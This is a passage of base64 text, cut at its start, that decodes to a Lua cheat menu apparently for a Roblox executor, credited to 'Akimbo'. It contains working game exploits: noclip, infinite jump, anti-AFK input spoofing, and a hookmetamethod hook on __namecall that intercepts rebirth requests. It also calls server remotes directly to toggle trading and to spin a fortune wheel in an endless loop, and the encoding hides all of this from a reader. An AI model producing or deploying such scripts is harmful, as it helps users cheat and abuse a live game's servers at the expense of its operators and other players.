pc2MgMi0tLS0iKS5UZXh0U2l6ZSA9IDIzCgpsb2NhbCBzd2l0Y2gKc3dpdGNoID0gTWlzYzpBZGRTd2l0Y2goIkFudGktQUZLIiwgZnVuY3Rpb24oc3RhdGUpCmlmIHN0YXRlIHRoZW4KbG9jYWwgUGxheWVycyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCmxvY2FsIFZpcnR1YWxVc2VyID0gZ2FtZTpHZXRTZXJ2aWNlKCJWaXJ0dWFsVXNlciIpCmxvY2FsIExvY2FsUGxheWVyID0gUGxheWVycy5Mb2NhbFBsYXllcgoKX0cuYWZrR3VpID0gSW5zdGFuY2UubmV3KCJTY3JlZW5HdWkiLCBMb2NhbFBsYXllcjpXYWl0Rm9yQ2hpbGQoIlBsYXllckd1aSIpKSAgCglfRy5hZmtHdWkuTmFtZSA9ICJBbnRpQUZLR3VpIiAgCglfRy5hZmtHdWkuUmVzZXRPblNwYXduID0gZmFsc2UgIAoKCWxvY2FsIHRpdGxlID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiLCBfRy5hZmtHdWkpICAKCXRpdGxlLlNpemUgPSBVRGltMi5uZXcoMCwgMjAwLCAwLCA1MCkgIAoJdGl0bGUuUG9zaXRpb24gPSBVRGltMi5uZXcoMC41LCAtMTAwLCAwLCAtNTApICAKCXRpdGxlLlRleHQgPSAiQU5USSBBRksiICAKCXRpdGxlLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQig1MCwgMjU1LCA1MCkgIAoJdGl0bGUuRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkICAKCXRpdGxlLlRleHRTaXplID0gMjAgIAoJdGl0bGUuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEgIAoJdGl0bGUuVGV4dFRyYW5zcGFyZW5jeSA9IDEgIAoKCWxvY2FsIHRpbWVyID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiLCBfRy5hZmtHdWkpICAKCXRpbWVyLlNpemUgPSBVRGltMi5uZXcoMCwgMjAwLCAwLCAzMCkgIAoJdGltZXIuUG9zaXRpb24gPSBVRGltMi5uZXcoMC41LCAtMTAwLCAwLCAtMjApICAKCXRpbWVyLlRleHQgPSAiMDA6MDA6MDAiICAKCXRpbWVyLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KSAgCgl0aW1lci5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQgIAoJdGltZXIuVGV4dFNpemUgPSAxOCAgCgl0aW1lci5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMSAgCgl0aW1lci5UZXh0VHJhbnNwYXJlbmN5ID0gMSAgCgoJbG9jYWwgc3RhcnRUaW1lID0gdGljaygpICAKCgl0YXNrLnNwYXduKGZ1bmN0aW9uKCkgIAoJCXdoaWxlIF9HLmFma0d1aSBhbmQgX0cuYWZrR3VpLlBhcmVudCBkbyAgCgkJCWxvY2FsIGVsYXBzZWQgPSB0aWNrKCkgLSBzdGFydFRpbWUgIAoJCQlsb2NhbCBoID0gbWF0aC5mbG9vcihlbGFwc2VkIC8gMzYwMCkgIAoJCQlsb2NhbCBtID0gbWF0aC5mbG9vcigoZWxhcHNlZCAlIDM2MDApIC8gNjApICAKCQkJbG9jYWwgcyA9IG1hdGguZmxvb3IoZWxhcHNlZCAlIDYwKSAgCgkJCXRpbWVyLlRleHQgPSBzdHJpbmcuZm9ybWF0KCIlMDJkOiUwMmQ6JTAyZCIsIGgsIG0sIHMpICAKCQkJdGFzay53YWl0KDEpICAKCQllbmQgIAoJZW5kKSAgCgoJdGFzay5zcGF3bihmdW5jdGlvbigpICAKCQl3aGlsZSBfRy5hZmtHdWkgYW5kIF9HLmFma0d1aS5QYXJlbnQgZG8gIAoJCQlmb3IgaSA9IDAsIDEsIDAuMDIgZG8gIAoJCQkJdGl0bGUuVGV4dFRyYW5zcGFyZW5jeSA9IDEgLSBpICAKCQkJCXRpbWVyLlRleHRUcmFuc3BhcmVuY3kgPSAxIC0gaSAgCgkJCQl0YXNrLndhaXQoMC4wMTUpICAKCQkJZW5kICAKCQkJdGFzay53YWl0KDEuNSkgIAoJCQlmb3IgaSA9IDAsIDEsIDAuMDIgZG8gIAoJCQkJdGl0bGUuVGV4dFRyYW5zcGFyZW5jeSA9IGkgIAoJCQkJdGltZXIuVGV4dFRyYW5zcGFyZW5jeSA9IGkgIAoJCQkJdGFzay53YWl0KDAuMDE1KSAgCgkJCWVuZCAgCgkJCXRhc2sud2FpdCgxKSAgCgkJZW5kICAKCWVuZCkgIAoKCV9HLmFma0Nvbm5lY3Rpb24gPSBQbGF5ZXJzLkxvY2FsUGxheWVyLklkbGVkOkNvbm5lY3QoZnVuY3Rpb24oKSAgCgkJVmlydHVhbFVzZXI6QnV0dG9uMkRvd24oVmVjdG9yMi5uZXcoKSwgd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lKSAgCgkJdGFzay53YWl0KDEpICAKCQlWaXJ0dWFsVXNlcjpCdXR0b24yVXAoVmVjdG9yMi5uZXcoKSwgd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lKSAgCgllbmQpICAKZWxzZSAgCglpZiBfRy5hZmtDb25uZWN0aW9uIHRoZW4gIAoJCV9HLmFma0Nvbm5lY3Rpb246RGlzY29ubmVjdCgpICAKCQlfRy5hZmtDb25uZWN0aW9uID0gbmlsICAKCWVuZCAgCglpZiBfRy5hZmtHdWkgdGhlbiAgCgkJX0cuYWZrR3VpOkRlc3Ryb3koKSAgCgkJX0cuYWZrR3VpID0gbmlsICAKCWVuZCAgCmVuZAoKZW5kKQoKc3dpdGNoOlNldCh0cnVlKQoKbG9jYWwgc3dpdGNoID0gTWlzYzpBZGRTd2l0Y2goIkFudGkgS25vY2tiYWNrIiwgZnVuY3Rpb24oVmFsdWUpCiAgICBpZiBWYWx1ZSB0aGVuCiAgICAgICAgbG9jYWwgcGxheWVyTmFtZSA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5OYW1lCiAgICAgICAgbG9jYWwgcm9vdFBhcnQgPSBnYW1lLldvcmtzcGFjZTpGaW5kRmlyc3RDaGlsZChwbGF5ZXJOYW1lKTpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgbG9jYWwgYm9keVZlbG9jaXR5ID0gSW5zdGFuY2UubmV3KCJCb2R5VmVsb2NpdHkiKQogICAgICAgIGJvZHlWZWxvY2l0eS5NYXhGb3JjZSA9IFZlY3RvcjMubmV3KDEwMDAwMCwgMCwgMTAwMDAwKQogICAgICAgIGJvZHlWZWxvY2l0eS5WZWxvY2l0eSA9IFZlY3RvcjMubmV3KDAsIDAsIDApCiAgICAgICAgYm9keVZlbG9jaXR5LlAgPSAxMjUwCiAgICAgICAgYm9keVZlbG9jaXR5LlBhcmVudCA9IHJvb3RQYXJ0CiAgICBlbHNlCiAgICAgICAgbG9jYWwgcGxheWVyTmFtZSA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5OYW1lCiAgICAgICAgbG9jYWwgcm9vdFBhcnQgPSBnYW1lLldvcmtzcGFjZTpGaW5kRmlyc3RDaGlsZChwbGF5ZXJOYW1lKTpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgbG9jYWwgZXhpc3RpbmdWZWxvY2l0eSA9IHJvb3RQYXJ0OkZpbmRGaXJzdENoaWxkKCJCb2R5VmVsb2NpdHkiKQogICAgICAgIGlmIGV4aXN0aW5nVmVsb2NpdHkgYW5kIGV4aXN0aW5nVmVsb2NpdHkuTWF4Rm9yY2UgPT0gVmVjdG9yMy5uZXcoMTAwMDAwLCAwLCAxMDAwMDApIHRoZW4KICAgICAgICAgICAgZXhpc3RpbmdWZWxvY2l0eTpEZXN0cm95KCkKICAgICAgICBlbmQKICAgIGVuZAplbmQpCnN3aXRjaDpTZXQodHJ1ZSkKCk1pc2M6QWRkQnV0dG9uKCJBbnRpIExhZyIsIGZ1bmN0aW9uKCkKICAgIGZvciBfLCB2IGluIHBhaXJzKGdhbWU6R2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICBpZiB2OklzQSgiUGFydGljbGVFbWl0dGVyIikgb3IgdjpJc0EoIlNtb2tlIikgb3IgdjpJc0EoIkZpcmUiKSBvciB2OklzQSgiU3BhcmtsZXMiKSB0aGVuCiAgICAgICAgICAgIHYuRW5hYmxlZCA9IGZhbHNlCiAgICAgICAgZW5kCiAgICBlbmQKIAogICAgbG9jYWwgbGlnaHRpbmcgPSBnYW1lOkdldFNlcnZpY2UoIkxpZ2h0aW5nIikKICAgIGxpZ2h0aW5nLkdsb2JhbFNoYWRvd3MgPSBmYWxzZQogICAgbGlnaHRpbmcuRm9nRW5kID0gOWU5CiAgICBsaWdodGluZy5CcmlnaHRuZXNzID0gMAogCiAgICBzZXR0aW5ncygpLlJlbmRlcmluZy5RdWFsaXR5TGV2ZWwgPSAxCiAKICAgIGZvciBfLCB2IGluIHBhaXJzKGdhbWU6R2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICBpZiB2OklzQSgiRGVjYWwiKSBvciB2OklzQSgiVGV4dHVyZSIpIHRoZW4KICAgICAgICAgICAgdi5UcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgZWxzZWlmIHY6SXNBKCJCYXNlUGFydCIpIGFuZCBub3QgdjpJc0EoIk1lc2hQYXJ0IikgdGhlbgogICAgICAgICAgICB2Lk1hdGVyaWFsID0gRW51bS5NYXRlcmlhbC5TbW9vdGhQbGFzdGljCiAgICAgICAgICAgIGlmIHYuUGFyZW50IGFuZCAodi5QYXJlbnQ6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikgb3Igdi5QYXJlbnQuUGFyZW50OkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpKSB0aGVuCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIHYuUmVmbGVjdGFuY2UgPSAwCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCiAKICAgIGZvciBfLCB2IGluIHBhaXJzKGxpZ2h0aW5nOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgaWYgdjpJc0EoIkJsdXJFZmZlY3QiKSBvciB2OklzQSgiU3VuUmF5c0VmZmVjdCIpIG9yIHY6SXNBKCJDb2xvckNvcnJlY3Rpb25FZmZlY3QiKSBvciB2OklzQSgiQmxvb21FZmZlY3QiKSBvciB2OklzQSgiRGVwdGhPZkZpZWxkRWZmZWN0IikgdGhlbgogICAgICAgICAgICB2LkVuYWJsZWQgPSBmYWxzZQogICAgICAgIGVuZAogICAgZW5kCiAKICAgIGdhbWU6R2V0U2VydmljZSgiU3RhcnRlckd1aSIpOlNldENvcmUoIlNlbmROb3RpZmljYXRpb24iLCB7CiAgICAgICAgVGl0bGUgPSAiYW50aSBsYWcgQWN0aXZhdGUiLAogICAgICAgIFRleHQgPSAiRnVsbCBvcHRpbWl6YXRpb24gYXBwbGllZCEiLAogICAgICAgIER1cmF0aW9uID0gNQogICAgfSkKZW5kKQpNaXNjOkFkZEJ1dHRvbigiRnVsbCBPcHRpbWl6YXRpb24iLCBmdW5jdGlvbigpCiAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKICAgIGxvY2FsIHBsYXllckd1aSA9IHBsYXllcjpXYWl0Rm9yQ2hpbGQoIlBsYXllckd1aSIpCiAgICBsb2NhbCBsaWdodGluZyA9IGdhbWU6R2V0U2VydmljZSgiTGlnaHRpbmciKQoKICAgIGZvciBfLCBndWkgaW4gcGFpcnMocGxheWVyR3VpOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgaWYgZ3VpOklzQSgiU2NyZWVuR3VpIikgdGhlbgogICAgICAgICAgICBndWk6RGVzdHJveSgpCiAgICAgICAgZW5kCiAgICBlbmQKCiAgICBsb2NhbCBmdW5jdGlvbiBkYXJrZW5Ta3koKQogICAgICAgIGZvciBfLCB2IGluIHBhaXJzKGxpZ2h0aW5nOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgIGlmIHY6SXNBKCJTa3kiKSB0aGVuCiAgICAgICAgICAgICAgICB2OkRlc3Ryb3koKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKCiAgICAgICAgbG9jYWwgZGFya1NreSA9IEluc3RhbmNlLm5ldygiU2t5IikKICAgICAgICBkYXJrU2t5Lk5hbWUgPSAiRGFya1NreSIKICAgICAgICBkYXJrU2t5LlNreWJveEJrID0gInJieGFzc2V0aWQ6Ly8wIgogICAgICAgIGRhcmtTa3kuU2t5Ym94RG4gPSAicmJ4YXNzZXRpZDovLzAiCiAgICAgICAgZGFya1NreS5Ta3lib3hGdCA9ICJyYnhhc3NldGlkOi8vMCIKICAgICAgICBkYXJrU2t5LlNreWJveExmID0gInJieGFzc2V0aWQ6Ly8wIgogICAgICAgIGRhcmtTa3kuU2t5Ym94UnQgPSAicmJ4YXNzZXRpZDovLzAiCiAgICAgICAgZGFya1NreS5Ta3lib3hVcCA9ICJyYnhhc3NldGlkOi8vMCIKICAgICAgICBkYXJrU2t5LlBhcmVudCA9IGxpZ2h0aW5nCgogICAgICAgIGxpZ2h0aW5nLkJyaWdodG5lc3MgPSAwCiAgICAgICAgbGlnaHRpbmcuQ2xvY2tUaW1lID0gMAogICAgICAgIGxpZ2h0aW5nLlRpbWVPZkRheSA9ICIwMDowMDowMCIKICAgICAgICBsaWdodGluZy5PdXRkb29yQW1iaWVudCA9IENvbG9yMy5uZXcoMCwgMCwgMCkKICAgICAgICBsaWdodGluZy5BbWJpZW50ID0gQ29sb3IzLm5ldygwLCAwLCAwKQogICAgICAgIGxpZ2h0aW5nLkZvZ0NvbG9yID0gQ29sb3IzLm5ldygwLCAwLCAwKQogICAgICAgIGxpZ2h0aW5nLkZvZ0VuZCA9IDEwMAoKICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgd2hpbGUgdHJ1ZSBkbwogICAgICAgICAgICAgICAgd2FpdCg1KQogICAgICAgICAgICAgICAgaWYgbm90IGxpZ2h0aW5nOkZpbmRGaXJzdENoaWxkKCJEYXJrU2t5IikgdGhlbgogICAgICAgICAgICAgICAgICAgIGRhcmtTa3k6Q2xvbmUoKS5QYXJlbnQgPSBsaWdodGluZwogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBsaWdodGluZy5CcmlnaHRuZXNzID0gMAogICAgICAgICAgICAgICAgbGlnaHRpbmcuQ2xvY2tUaW1lID0gMAogICAgICAgICAgICAgICAgbGlnaHRpbmcuT3V0ZG9vckFtYmllbnQgPSBDb2xvcjMubmV3KDAsIDAsIDApCiAgICAgICAgICAgICAgICBsaWdodGluZy5BbWJpZW50ID0gQ29sb3IzLm5ldygwLCAwLCAwKQogICAgICAgICAgICAgICAgbGlnaHRpbmcuRm9nQ29sb3IgPSBDb2xvcjMubmV3KDAsIDAsIDApCiAgICAgICAgICAgICAgICBsaWdodGluZy5Gb2dFbmQgPSAxMDAKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZW5kCgogICAgbG9jYWwgZnVuY3Rpb24gcmVtb3ZlUGFydGljbGVFZmZlY3RzKCkKICAgICAgICBmb3IgXywgb2JqIGluIHBhaXJzKHdvcmtzcGFjZTpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICBpZiBvYmo6SXNBKCJQYXJ0aWNsZUVtaXR0ZXIiKSB0aGVuCiAgICAgICAgICAgICAgICBvYmo6RGVzdHJveSgpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCgogICAgbG9jYWwgZnVuY3Rpb24gcmVtb3ZlTGlnaHRTb3VyY2VzKCkKICAgICAgICBmb3IgXywgb2JqIGluIHBhaXJzKHdvcmtzcGFjZTpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICBpZiBvYmo6SXNBKCJQb2ludExpZ2h0Iikgb3Igb2JqOklzQSgiU3BvdExpZ2h0Iikgb3Igb2JqOklzQSgiU3VyZmFjZUxpZ2h0IikgdGhlbgogICAgICAgICAgICAgICAgb2JqOkRlc3Ryb3koKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAoKICAgIHJlbW92ZVBhcnRpY2xlRWZmZWN0cygpCiAgICByZW1vdmVMaWdodFNvdXJjZXMoKQogICAgZGFya2VuU2t5KCkKZW5kKQoKTWlzYzpBZGRMYWJlbCgiLS0tLU1pc2MgMy0tLS0iKS5UZXh0U2l6ZSA9IDIzCgpNaXNjOkFkZFN3aXRjaCgiTG9jayBQb3NpdGlvbiIsIGZ1bmN0aW9uKFZhbHVlKQogICAgaWYgVmFsdWUgdGhlbgogICAgICAgIAogICAgICAgIGxvY2FsIGN1cnJlbnRQb3MgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lCiAgICAgICAgZ2V0Z2VudigpLnBvc0xvY2sgPSBnYW1lOkdldFNlcnZpY2UoIlJ1blNlcnZpY2UiKS5IZWFydGJlYXQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgIGlmIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSB0aGVuCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gY3VycmVudFBvcwogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbHNlCiAgICAgICAgCiAgICAgICAgaWYgZ2V0Z2VudigpLnBvc0xvY2sgdGhlbgogICAgICAgICAgICBnZXRnZW52KCkucG9zTG9jazpEaXNjb25uZWN0KCkKICAgICAgICAgICAgZ2V0Z2VudigpLnBvc0xvY2sgPSBuaWwKICAgICAgICBlbmQKICAgIGVuZAplbmQpCgpNaXNjOkFkZFN3aXRjaCgiSGlkZSBBbGwgRnJhbWVzIiwgZnVuY3Rpb24oYm9vbCkKICAgIGxvY2FsIHJTdG8gPSBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikKICAgIGZvciBfLCBvYmogaW4gcGFpcnMoclN0bzpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgIGlmIG9iai5OYW1lOm1hdGNoKCJGcmFtZSQiKSB0aGVuCiAgICAgICAgICAgIG9iai5WaXNpYmxlID0gbm90IGJvb2wKICAgICAgICBlbmQKICAgIGVuZAplbmQpCgpNaXNjOkFkZFN3aXRjaCgiRGlzYWJsZSBUcmFkZXMiLCBmdW5jdGlvbihTdGF0ZSkKaWYgU3RhdGUgdGhlbgogICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5yRXZlbnRzLnRyYWRpbmdFdmVudDpGaXJlU2VydmVyKCJkaXNhYmxlVHJhZGluZyIpCiAgICBlbHNlCiAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLnJFdmVudHMudHJhZGluZ0V2ZW50OkZpcmVTZXJ2ZXIoImVuYWJsZVRyYWRpbmciKQogICAgZW5kCmVuZCkKCk1pc2M6QWRkU3dpdGNoKCJCbG9jayBSZWJpcnRocyIsIGZ1bmN0aW9uKCkKbG9jYWwgT2xkTmFtZUNhbGwgPSBuaWwKICAgIE9sZE5hbWVDYWxsID0gaG9va21ldGFtZXRob2QoZ2FtZSwgIl9fbmFtZWNhbGwiLCBmdW5jdGlvbihzZWxmLCAuLi4pCiAgICAgICAgbG9jYWwgQXJncyA9IHsKICAgICAgICAgICAgLi4uCiAgICAgICAgfQogICAgICAgIGlmIHNlbGYuTmFtZSA9PSAicmViaXJ0aFJlbW90ZSIgYW5kIEFyZ3NbMV0gPT0gInJlYmlydGhSZXF1ZXN0IiB0aGVuCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVuZAogICAgICAgIHJldHVybiBPbGROYW1lQ2FsbChzZWxmLCB1bnBhY2soQXJncykpCiAgICBlbmQpCmVuZCkKCk1pc2M6QWRkU3dpdGNoKCJCbG9jayBUcmFkZXMiLCBmdW5jdGlvbigpCmdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5yRXZlbnRzLnRyYWRpbmdFdmVudDpGaXJlU2VydmVyKCJkaXNhYmxlVHJhZGluZyIpCmVuZCkKCk1pc2M6QWRkTGFiZWwoIi0tLS1NaXNjIDQtLS0tIikuVGV4dFNpemUgPSAyMwoKTWlzYzpBZGRTd2l0Y2goIkluZmluaXRlIEp1bXAiLCBmdW5jdGlvbihib29sKQogICAgX0cuSW5maW5pdGVKdW1wID0gYm9vbAogICAgCiAgICBpZiBib29sIHRoZW4KICAgICAgICBsb2NhbCBJbmZpbml0ZUp1bXBDb25uZWN0aW9uCiAgICAgICAgSW5maW5pdGVKdW1wQ29ubmVjdGlvbiA9IGdhbWU6R2V0U2VydmljZSgiVXNlcklucHV0U2VydmljZSIpLkp1bXBSZXF1ZXN0OkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICBpZiBfRy5JbmZpbml0ZUp1bXAgdGhlbgogICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKTpDaGFuZ2VTdGF0ZSgiSnVtcGluZyIpCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIEluZmluaXRlSnVtcENvbm5lY3Rpb246RGlzY29ubmVjdCgpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgIGVuZAplbmQpCgoKTWlzYzpBZGRTd2l0Y2goIk5vQ2xpcCIsIGZ1bmN0aW9uKGJvb2wpCiAgICBfRy5Ob0NsaXAgPSBib29sCiAKICAgIGlmIGJvb2wgdGhlbgogICAgICAgIGxvY2FsIG5vY2xpcExvb3AKICAgICAgICBub2NsaXBMb29wID0gZ2FtZTpHZXRTZXJ2aWNlKCJSdW5TZXJ2aWNlIikuU3RlcHBlZDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgaWYgX0cuTm9DbGlwIHRoZW4KICAgICAgICAgICAgICAgIGZvciBfLCBwYXJ0IGluIHBhaXJzKGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6R2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgICAgICAgICBpZiBwYXJ0OklzQSgiQmFzZVBhcnQiKSBhbmQgcGFydC5DYW5Db2xsaWRlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgcGFydC5DYW5Db2xsaWRlID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBub2NsaXBMb29wOkRpc2Nvbm5lY3QoKQogICAgICAgICAgICBlbmQKICAgICAgIGVuZCkKCSAgIGVuZAplbmQpCgpNaXNjOkFkZFN3aXRjaCgiU3BpbiBGb3J0dW5lIFdoZWVsIiwgZnVuY3Rpb24oYm9vbCkKICAgIF9HLkF1dG9TcGluV2hlZWwgPSBib29sCiAgICAKICAgIGlmIGJvb2wgdGhlbgogICAgICAgIHNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgd2hpbGUgX0cuQXV0b1NwaW5XaGVlbCBhbmQgd2FpdCgxKSBkbwogICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLnJFdmVudHMub3BlbkZvcnR1bmVXaGVlbFJlbW90ZTpJbnZva2VTZXJ2ZXIoIm9wZW5Gb3J0dW5lV2hlZWwiLCBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuZm9ydHVuZVdoZWVsQ2hhbmNlc1siRm9ydHVuZSBXaGVlbCJdKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKZW5kKQoKTGlnaHRpbmcgPSBnYW1lOkdldFNlcnZpY2UoIkxpZ2h0aW5nIikKCi0tIFRhYmxhIHBhcmEgcmVnaXN0cmFyIGxvcyB0aWVtcG9zIGRpc3BvbmlibGVzCmxvY2FsIHRpbWVPcHRpb25zID0gewogICAgIk1vcm5pbmciLAogICAgIk5vb24iLAogICAgIkFmdGVybm9vbiIsCiAgICAiU3Vuc2V0IiwKICAgICJOaWdodCIsCiAgICAiTWlkbmlnaHQiLAogICAgIkRhd24iLAogICAgIkVhcmx5IE1vcm5pbmciCn0KCi0tIERyb3Bkb3duCnRpbWVEcm9wZG93biA9IE1pc2M6QWRkRHJvcGRvd24oImNoYW5nZSB0aW1lIiwgZnVuY3Rpb24oc2VsZWN0aW9uKQogICAgLS0gUmVzZXQgYW50ZXMgZGUgYXBsaWNhcgogICAgTGlnaHRpbmcuQnJpZ2h0bmVzcyA9IDIKICAgIExpZ2h0aW5nLkZvZ0VuZCA9IDEwMDAwMAogICAgTGlnaHRpbmcuQW1iaWVudCA9IENvbG9yMy5mcm9tUkdCKDEyNywxMjcsMTI3KQoKICAgIGlmIHNlbGVjdGlvbiA9PSAiTW9ybmluZyIgdGhlbgogICAgICAgIExpZ2h0aW5nLkNsb2NrVGltZSA9IDYKICAgICAgICBMaWdodGluZy5CcmlnaHRuZXNzID0gMgogICAgICAgIExpZ2h0aW5nLkFtYmllbnQgPSBDb2xvcjMuZnJvbVJHQigyMDAsIDIwMCwgMjU1KQogICAgZWxzZWlmIHNlbGVjdGlvbiA9PSAiTm9vbiIgdGhlbgogICAgICAgIExpZ2h0aW5nLkNsb2NrVGltZSA9IDEyCiAgICAgICAgTGlnaHRpbmcuQnJpZ2h0bmVzcyA9IDMKICAgICAgICBMaWdodGluZy5BbWJpZW50ID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKICAgIGVsc2VpZiBzZWxlY3Rpb24gPT0gIkFmdGVybm9vbiIgdGhlbgogICAgICAgIExpZ2h0aW5nLkNsb2NrVGltZSA9IDE2CiAgICAgICAgTGlnaHRpbmcuQnJpZ2h0bmVzcyA9IDIuNQogICAgICAgIExpZ2h0aW5nLkFtYmllbnQgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDIyMCwgMTgwKQogICAgZWxzZWlmIHNlbGVjdGlvbiA9PSAiU3Vuc2V0IiB0aGVuCiAgICAgICAgTGlnaHRpbmcuQ2xvY2tUaW1lID0gMTgKICAgICAgICBMaWdodGluZy5CcmlnaHRuZXNzID0gMgogICAgICAgIExpZ2h0aW5nLkFtYmllbnQgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDE1MCwgMTAwKQogICAgICAgIExpZ2h0aW5nLkZvZ0VuZCA9IDUwMAogICAgZWxzZWlmIHNlbGVjdGlvbiA9PSAiTmlndGgiIHRoZW4KICAgICAgICBMaWdodGluZy5DbG9ja1RpbWUgPSAyMAogICAgICAgIExpZ2h0aW5nLkJyaWdodG5lc3MgPSAxLjUKICAgICAgICBMaWdodGluZy5BbWJpZW50ID0gQ29sb3IzLmZyb21SR0IoMTAwLCAxMDAsIDE1MCkKICAgICAgICBMaWdodGluZy5Gb2dFbmQgPSA4MDAKICAgIGVsc2VpZiBzZWxlY3Rpb24gPT0gIk1pZG5pZ2h0IiB0aGVuCiAgICAgICAgTGlnaHRpbmcuQ2xvY2tUaW1lID0gMAogICAgICAgIExpZ2h0aW5nLkJyaWdodG5lc3MgPSAxCiAgICAgICAgTGlnaHRpbmcuQW1iaWVudCA9IENvbG9yMy5mcm9tUkdCKDUwLCA1MCwgMTAwKQogICAgICAgIExpZ2h0aW5nLkZvZ0VuZCA9IDQwMAogICAgZWxzZWlmIHNlbGVjdGlvbiA9PSAiRGF3biIgdGhlbgogICAgICAgIExpZ2h0aW5nLkNsb2NrVGltZSA9IDQKICAgICAgICBMaWdodGluZy5CcmlnaHRuZXNzID0gMS44CiAgICAgICAgTGlnaHRpbmcuQW1iaWVudCA9IENvbG9yMy5mcm9tUkdCKDE4MCwgMTgwLCAyMjApCiAgICBlbHNlaWYgc2VsZWN0aW9uID09ICJFYXJseSBNb3JuaW5nIiB0aGVuCiAgICAgICAgTGlnaHRpbmcuQ2xvY2tUaW1lID0gMgogICAgICAgIExpZ2h0aW5nLkJyaWdodG5lc3MgPSAxLjIKICAgICAgICBMaWdodGluZy5BbWJpZW50ID0gQ29sb3IzLmZyb21SR0IoMTAwLCAxMjAsIDE4MCkKICAgIGVuZAplbmQpCgotLSBBZ3JlZ2FyIG9wY2lvbmVzIGFsIGRyb3Bkb3duIGRpbsODwqFtaWNhbWVudGUKZm9yIF8sIG9wdGlvbiBpbiBpcGFpcnModGltZU9wdGlvbnMpIGRvCiAgICB0aW1lRHJvcGRvd246QWRkKG9wdGlvbikKZW5kCgpsb2NhbCBDcmVkaXRzID0gd2luZG93OkFkZFRhYigiQ3JlZGl0cyIpCgpDcmVkaXRzOkFkZExhYmVsKCJNYWRlIEJ5OiBBa2ltYm8iKQpDcmVkaXRzOkFkZExhYmVsKCJTTEggUFVCTElDIikKQ3JlZGl0czpBZGRMYWJlbCgiU3RpbmdMaWtlQUhvbHki